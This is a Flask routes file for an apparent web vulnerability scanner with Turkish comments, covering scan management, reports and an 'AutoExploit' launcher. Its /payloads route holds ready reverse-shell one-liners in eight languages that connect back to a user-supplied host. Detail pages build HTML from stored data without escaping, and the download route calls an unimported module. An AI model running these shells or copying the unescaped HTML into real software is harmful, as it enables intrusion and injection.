# cyberapp/routes/scans.py

import datetime
import io
import csv
import threading

from flask import Blueprint, jsonify, make_response, redirect, render_template, request, session

from cyberapp.models.db import db_conn
from cybermodules.helpers import PDFReport, tr_fix
from cybermodules.autoexploit import AutoExploit
from cyberapp.services.worker import run_worker
from cyberapp.services.audit import log_audit as audit_log
from cyberapp.services.queue import enqueue_job

scans_bp = Blueprint("scans", __name__)


@scans_bp.route("/scans")
def scans_list():
    """Tüm taramaları listele"""
    if not session.get("logged_in"):
        return redirect("/login")
    
    try:
        with db_conn() as conn:
            scans = conn.execute(
                "SELECT id, target, date, status, user_id FROM scans ORDER BY id DESC LIMIT 50"
            ).fetchall()
            print(f"DEBUG: Found {len(scans)} scans")
            
            # İlerleme verilerini al
            progress_data = {}
            for scan in scans:
                prog = conn.execute(
                    "SELECT progress, eta_seconds FROM scan_progress WHERE scan_id = ?",
                    (scan[0],)
                ).fetchone()
                progress_data[scan[0]] = prog if prog else (0, None)
            
            # İstatistikleri hesapla
            completed_count = sum(1 for s in scans if 'COMPLETED' in s[3] or 'TAMAMLANDI' in s[3])
            running_count = sum(1 for s in scans if 'RUNNING' in s[3] or 'DEVAM' in s[3])
            failed_count = sum(1 for s in scans if 'FAILED' in s[3] or 'HATA' in s[3])
            
            print(f"DEBUG: completed={completed_count}, running={running_count}, failed={failed_count}")
        
        return render_template(
            "scans.html",
            scans=scans,
            progress_data=progress_data,
            completed_count=completed_count,
            running_count=running_count,
            failed_count=failed_count
        )
    except Exception as e:
        import traceback
        traceback.print_exc()
        return f"Error: {str(e)}", 500


@scans_bp.route("/scan", methods=["POST"])
def scan():
    """Yeni tarama başlat"""
    if not session.get("logged_in"):
        return redirect("/login")

    target = request.form.get("target", "").strip()
    run_python = request.form.get("python_scan") == "on"
    tools = request.form.getlist("tools")
    user_id = session.get("user", "anonymous")

    if not target:
        return redirect("/")

    # URL protokolünü ekle
    if not target.startswith(("http://", "https://")):
        target = "http://" + target

    # Veritabanına tarama kaydı ekle
    with db_conn() as conn:
        cursor = conn.cursor()
        cursor.execute(
            """
            INSERT INTO scans (target, date, status, user_id)
            VALUES (?, ?, ?, ?)
            """,
            (target, datetime.datetime.now().isoformat(), "HAZIRLANIYOR...", user_id),
        )
        scan_id = cursor.lastrowid
        conn.execute(
            "INSERT INTO scan_progress (scan_id, progress, eta_seconds) VALUES (?, ?, ?)",
            (scan_id, 0, None),
        )
        conn.commit()

    audit_log(user_id, session.get("role"), "scan_started", f"scan_id={scan_id} target={target}", request.remote_addr)

    # Arka planda taramayı başlat
    enqueue_job(run_worker, target, scan_id, run_python, tools, user_id)

    return redirect("/")


@scans_bp.route("/scan_status/<int:scan_id>")
def scan_status(scan_id):
    """Tarama durumunu JSON olarak getir"""
    if not session.get("logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    
    try:
        with db_conn() as conn:
            progress = conn.execute(
                "SELECT progress, eta_seconds FROM scan_progress WHERE scan_id = ?",
                (scan_id,)
            ).fetchone()
            
            status = conn.execute(
                "SELECT status, target FROM scans WHERE id = ?",
                (scan_id,)
            ).fetchone()
            
            # Zafiyet sayısını al
            vuln_count = conn.execute(
                "SELECT COUNT(*) FROM vulns WHERE scan_id = ?",
                (scan_id,)
            ).fetchone()[0]
            
            return jsonify({
                "scan_id": scan_id,
                "progress": progress[0] if progress else 0,
                "eta_seconds": progress[1] if progress else None,
                "status": status[0] if status else "Unknown",
                "target": status[1] if status else "Unknown",
                "vuln_count": vuln_count
            })
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@scans_bp.route("/delete/<int:scan_id>")
def delete_scan(scan_id):
    """Taramayı sil"""
    if not session.get("logged_in"):
        return redirect("/login")
    if session.get("role") != "admin":
        return "Forbidden", 403

    with db_conn() as conn:
        conn.execute("DELETE FROM scans WHERE id = ?", (scan_id,))
        conn.execute("DELETE FROM vulns WHERE scan_id = ?", (scan_id,))
        conn.execute("DELETE FROM intel WHERE scan_id = ?", (scan_id,))
        conn.execute("DELETE FROM tool_logs WHERE scan_id = ?", (scan_id,))
        conn.execute("DELETE FROM scan_progress WHERE scan_id = ?", (scan_id,))
        conn.commit()

    audit_log(session.get("user"), session.get("role"), "scan_deleted", f"scan_id={scan_id}", request.remote_addr)
    return redirect("/")


@scans_bp.route("/details/<int:scan_id>")
def details(scan_id):
    """Tarama detaylarını göster"""
    if not session.get("logged_in"):
        return redirect("/login")

    try:
        with db_conn() as conn:
            scan = conn.execute("SELECT * FROM scans WHERE id=?", (scan_id,)).fetchone()
            if not scan:
                return "Scan not found", 404

            vulns = conn.execute("SELECT * FROM vulns WHERE scan_id=?", (scan_id,)).fetchall()
            techs = conn.execute("SELECT * FROM techno WHERE scan_id=?", (scan_id,)).fetchall()
            intel = conn.execute("SELECT * FROM intel WHERE scan_id=?", (scan_id,)).fetchall()
            logs = conn.execute("SELECT * FROM tool_logs WHERE scan_id=?", (scan_id,)).fetchall()

        # HTML içeriklerini oluştur
        vuln_html = ""
        for v in vulns:
            vuln_type = v[2] if len(v) > 2 else "Unknown"
            vuln_url = v[3] if len(v) > 3 else "N/A"
            vuln_fix = v[4] if len(v) > 4 else "Önerilecek önlem aranıyor..."
            vuln_severity = v[5] if len(v) > 5 else "MEDIUM"
            
            severity_colors = {
                'CRITICAL': '#ff4757',
                'HIGH': '#ffa502',
                'MEDIUM': '#eccc68',
                'LOW': '#2ed573',
                'INFO': '#70a1ff'
            }
            color = severity_colors.get(vuln_severity, '#eccc68')
            
            vuln_html += f"""
            <div style="background: #1a1a2e; padding: 15px; margin: 10px 0; border-left: 4px solid {color}; border-radius: 0 10px 10px 0;">
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                    <h3 style="color: {color}; margin: 0;">⚠️ {vuln_type}</h3>
                    <span style="background: {color}20; color: {color}; padding: 3px 10px; border-radius: 15px; font-size: 0.8em;">{vuln_severity}</span>
                </div>
                <p style="margin: 5px 0;"><strong>URL:</strong> <code style="background: rgba(0,0,0,0.3); padding: 2px 8px; border-radius: 4px;">{vuln_url}</code></p>
                <p style="margin: 5px 0; color: #aaa;"><strong>Açıklama:</strong> {vuln_fix}</p>
            </div>
            """

        tech_html = ""
        for t in techs:
            tech_name = t[2] if len(t) > 2 else "Unknown"
            tech_via = t[3] if len(t) > 3 else "Detection method"
            tech_html += f"""
            <div style="background: #1a1a2e; padding: 10px; margin: 5px 0; border-left: 4px solid #00d4ff; border-radius: 0 10px 10px 0;">
                <strong style="color: #00d4ff;">{tech_name}</strong>
                <span style="color: #888; font-size: 0.9em;"> | Tespit: {tech_via}</span>
            </div>
            """

        intel_html = ""
        if intel:
            intel_html = "<div style=\"background: #1a1a2e; padding: 15px; border-radius: 10px;\">"
            for i in intel:
                if i and len(i) >= 4:
                    intel_html += f"<p style=\"margin: 8px 0; padding: 8px; background: rgba(0,255,136,0.1); border-radius: 5px; border-left: 3px solid #00ff88;\"><strong style=\"color: #00ff88;\">[{i[2]}]</strong> <span style=\"color: #ccc;\">{i[3][:200]}</span></p>"
            intel_html += "</div>"

        logs_html = ""
        if logs:
            logs_html = "<div style=\"background: #0d0d0d; padding: 15px; border-radius: 10px; font-family: monospace; font-size: 0.85em; max-height: 400px; overflow-y: auto;\">"
            for log in logs:
                if log and len(log) >= 4:
                    logs_html += f"<div style=\"margin: 5px 0; padding: 5px; border-bottom: 1px solid #333;\"><span style=\"color: #ffa502;\">[{log[2]}]</span> <span style=\"color: #888;\">{str(log[3])[:150]}</span></div>"
            logs_html += "</div>"

        # İstatistikler
        critical_count = sum(1 for v in vulns if len(v) > 5 and v[5] == 'CRITICAL')
        high_count = sum(1 for v in vulns if len(v) > 5 and v[5] == 'HIGH')
        medium_count = sum(1 for v in vulns if len(v) > 5 and v[5] == 'MEDIUM')
        
        stats_html = f"""
        <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; margin: 20px 0;">
            <div style="background: rgba(255,71,87,0.2); padding: 20px; border-radius: 10px; text-align: center; border: 1px solid rgba(255,71,87,0.3);">
                <div style="font-size: 2.5em; font-weight: bold; color: #ff4757;">{critical_count}</div>
                <div style="color: #ff4757;">Critical</div>
            </div>
            <div style="background: rgba(255,165,2,0.2); padding: 20px; border-radius: 10px; text-align: center; border: 1px solid rgba(255,165,2,0.3);">
                <div style="font-size: 2.5em; font-weight: bold; color: #ffa502;">{high_count}</div>
                <div style="color: #ffa502;">High</div>
            </div>
            <div style="background: rgba(236,204,104,0.2); padding: 20px; border-radius: 10px; text-align: center; border: 1px solid rgba(236,204,104,0.3);">
                <div style="font-size: 2.5em; font-weight: bold; color: #eccc68;">{medium_count}</div>
                <div style="color: #eccc68;">Medium</div>
            </div>
            <div style="background: rgba(0,212,255,0.2); padding: 20px; border-radius: 10px; text-align: center; border: 1px solid rgba(0,212,255,0.3);">
                <div style="font-size: 2.5em; font-weight: bold; color: #00d4ff;">{len(techs)}</div>
                <div style="color: #00d4ff;">Technologies</div>
            </div>
        </div>
        """

        return render_template(
            "details.html",
            scan=scan,
            vulns=vulns,
            techs=techs,
            vuln_html=vuln_html,
            tech_html=tech_html,
            intel_html=intel_html,
            logs_html=logs_html,
            stats_html=stats_html,
            critical_count=critical_count,
            high_count=high_count,
            medium_count=medium_count
        )
    except Exception as e:
        import traceback
        traceback.print_exc()
        return f"<html><body>Error: {str(e)}</body></html>", 500


@scans_bp.route("/payloads", methods=["GET", "POST"])
def payloads_generator():
    """Payload üretici"""
    if not session.get("logged_in"):
        return redirect("/login")

    payloads_dict = {
        "bash": "bash -i >& /dev/tcp/LHOST/LPORT 0>&1",
        "python": """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,sOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' """,
        "php": """php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");' """,
        "nc": "nc -e /bin/sh LHOST LPORT",
        "perl": """perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' """,
        "node": """node -e 'require("child_process").exec("bash -i >& /dev/tcp/LHOST/LPORT 0>&1")' """,
        "ruby": """ruby -rsocket -e 'c=TCPSocket.new("LHOST",LPORT);while true;cmd=c.gets;system(cmd);c.puts `#{cmd}`;end' """,
        "powershell": """powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);""",
    }

    if request.method == "POST":
        lhost = request.form.get("lhost", "127.0.0.1")
        lport = request.form.get("lport", "4444")
        payload_type = request.form.get("payload_type", "bash")

        payload = payloads_dict.get(payload_type, payloads_dict["bash"])
        payload = payload.replace("LHOST", lhost).replace("LPORT", lport)

        with db_conn() as conn:
            conn.execute(
                "INSERT INTO tool_logs (scan_id, tool_name, output) VALUES (?, ?, ?)",
                (0, "PAYLOAD_GENERATOR", f"[{payload_type}] {lhost}:{lport}"),
            )
            conn.commit()

        payload_html = (
            "<code style='background: #1a1a2e; padding: 10px; display: block; word-wrap: break-word; border-radius: 5px; color: #00ff88;'>"
            f"{payload}</code>"
        )
    else:
        payload_html = ""

    return render_template("payloads.html", payload_html=payload_html, payloads_dict=payloads_dict)


@scans_bp.route("/autoexploit")
def autoexploit_panel():
    """AutoExploit paneli"""
    if not session.get("logged_in"):
        return redirect("/login")

    with db_conn() as conn:
        scans = conn.execute(
            """
            SELECT id, target, status FROM scans
            WHERE status LIKE '%COMPLETED%' OR status LIKE '%TAMAMLANDI%'
            ORDER BY id DESC
            LIMIT 10
            """
        ).fetchall()

    return render_template("autoexploit.html", scans=scans)


@scans_bp.route("/autoexploit/<int:scan_id>")
def start_autoexploit(scan_id):
    """AutoExploit başlat"""
    if not session.get("logged_in"):
        return redirect("/login")

    with db_conn() as conn:
        target = conn.execute("SELECT target FROM scans WHERE id = ?", (scan_id,)).fetchone()

    if target:
        autoexploit = AutoExploit(scan_id, target[0])
        threading.Thread(target=autoexploit.start, daemon=True).start()
        return jsonify(
            {
                "status": "started",
                "scan_id": scan_id,
                "message": "AutoExploit started in background",
            }
        )

    return jsonify({"error": "Scan not found"})


@scans_bp.route("/report/<int:scan_id>")
def generate_report(scan_id):
    """Kapsamlı güvenlik raporu oluştur"""
    if not session.get("logged_in"):
        return redirect("/login")
    
    try:
        from cybermodules.report_generator import generate_detailed_report
        
        result = generate_detailed_report(scan_id)
        
        # Rapor oluşturmayı logla
        try:
            with db_conn() as conn:
                conn.execute(
                    "INSERT INTO intel (scan_id, type, data) VALUES (?, ?, ?)",
                    (scan_id, "REPORT_GENERATED", f"HTML: {result['html_path']}, Risk: {result['risk_score']}")
                )
                conn.commit()
        except Exception:
            pass
        
        # İndirme bağlantılarını döndür
        return render_template(
            "report_template.html",
            scan_id=scan_id,
            report=result,
            target=result.get('target', 'Unknown')
        )
        
    except Exception as e:
        import traceback
        traceback.print_exc()
        return f"Report generation error: {str(e)}", 500


@scans_bp.route("/api/report/<int:scan_id>")
def api_generate_report(scan_id):
    """API endpoint for report generation"""
    if not session.get("logged_in"):
        return jsonify({"success": False, "error": "Unauthorized"}), 401
    
    try:
        from cybermodules.report_generator import generate_detailed_report
        result = generate_detailed_report(scan_id)
        
        return jsonify({
            "success": True,
            "report": result
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})


@scans_bp.route("/download/report/<int:scan_id>")
def download_report(scan_id):
    """Rapor dosyasını indir"""
    if not session.get("logged_in"):
        return redirect("/login")
    
    import os
    from flask import send_file
    
    format_type = request.args.get("format", "html")
    
    try:
        with db_conn() as conn:
            scan = conn.execute("SELECT target FROM scans WHERE id = ?", (scan_id,)).fetchone()
            target = scan[0] if scan else "Unknown"
    
        target_clean = re.sub(r'[^\w\-.]', '_', str(target).replace('/', '_'))
        
        if format_type == "pdf":
            filename = f"/tmp/report_{scan_id}.pdf"
            if os.path.exists(filename):
                return send_file(
                    filename,
                    as_attachment=True,
                    download_name=f"security_report_{target_clean}_{scan_id}.pdf"
                )
        elif format_type == "json":
            filename = f"/tmp/report_{scan_id}_{target_clean}_summary.json"
            if os.path.exists(filename):
                return send_file(
                    filename,
                    as_attachment=True,
                    download_name=f"security_report_{target_clean}_{scan_id}.json"
                )
        else:
            filename = f"/tmp/report_{scan_id}_{target_clean}.html"
            if os.path.exists(filename):
                return send_file(
                    filename,
                    as_attachment=True,
                    download_name=f"security_report_{target_clean}_{scan_id}.html",
                    mimetype='text/html'
                )
                
        return "Report file not found", 404
        
    except Exception as e:
        return f"Download error: {str(e)}", 500


@scans_bp.route("/api/scan/<int:scan_id>/vulns")
def api_get_vulnerabilities(scan_id):
    """API: Zafiyet listesini JSON olarak getir"""
    if not session.get("logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    
    try:
        with db_conn() as conn:
            vulns = conn.execute(
                "SELECT type, url, fix, severity FROM vulns WHERE scan_id = ?", 
                (scan_id,)
            ).fetchall()
            
            vuln_list = []
            for v in vulns:
                vuln_list.append({
                    "type": v[0],
                    "url": v[1],
                    "fix": v[2],
                    "severity": v[3]
                })
            
            return jsonify({
                "scan_id": scan_id,
                "count": len(vuln_list),
                "vulnerabilities": vuln_list
            })
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@scans_bp.route("/api/scan/<int:scan_id>/stats")
def api_get_scan_stats(scan_id):
    """API: Tarama istatistiklerini getir"""
    if not session.get("logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    
    try:
        with db_conn() as conn:
            # Zafiyet sayıları
            critical = conn.execute(
                "SELECT COUNT(*) FROM vulns WHERE scan_id = ? AND severity = 'CRITICAL'", 
                (scan_id,)
            ).fetchone()[0]
            
            high = conn.execute(
                "SELECT COUNT(*) FROM vulns WHERE scan_id = ? AND severity = 'HIGH'", 
                (scan_id,)
            ).fetchone()[0]
            
            medium = conn.execute(
                "SELECT COUNT(*) FROM vulns WHERE scan_id = ? AND severity = 'MEDIUM'", 
                (scan_id,)
            ).fetchone()[0]
            
            low = conn.execute(
                "SELECT COUNT(*) FROM vulns WHERE scan_id = ? AND severity = 'LOW'", 
                (scan_id,)
            ).fetchone()[0]
            
            # Teknoloji sayısı
            tech_count = conn.execute(
                "SELECT COUNT(*) FROM techno WHERE scan_id = ?", 
                (scan_id,)
            ).fetchone()[0]
            
            return jsonify({
                "scan_id": scan_id,
                "vulnerabilities": {
                    "critical": critical,
                    "high": high,
                    "medium": medium,
                    "low": low,
                    "total": critical + high + medium + low
                },
                "technologies": tech_count
            })
    except Exception as e:
        return jsonify({"error": str(e)}), 500
